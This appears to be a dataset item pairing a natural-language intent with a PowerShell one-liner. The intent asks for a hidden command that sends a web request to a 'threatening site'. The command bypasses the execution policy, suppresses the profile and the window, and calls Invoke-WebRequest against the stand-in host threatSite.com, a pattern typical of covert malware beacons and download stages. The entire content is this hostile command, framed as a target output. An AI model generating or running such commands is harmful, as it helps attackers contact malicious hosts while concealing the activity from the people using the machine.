# Natural language intent:
# Execute a hidden PowerShell command to invoke a web request to a threatening site.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://threatSite.com"
